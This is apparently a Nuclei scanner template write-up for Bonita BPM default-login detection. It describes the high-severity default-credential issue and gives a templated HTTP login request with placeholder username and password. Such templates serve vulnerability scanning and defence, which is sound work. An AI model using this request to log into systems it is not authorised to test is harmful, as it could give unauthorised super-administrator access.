# Nuclei Template: Bonita - Default Login
**Template ID:** bonita-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`bonita-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Bonita login was using default credentials which can led to gain super administrator access.

## Steps to reproduce / Exploit Payload
```http
POST /bonita/loginservice?redirect=true&redirectUrl=%2Fbonita%2Fapps%2FappDirectoryBonita HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username={{username}}&password={{password}}&_l=en
```

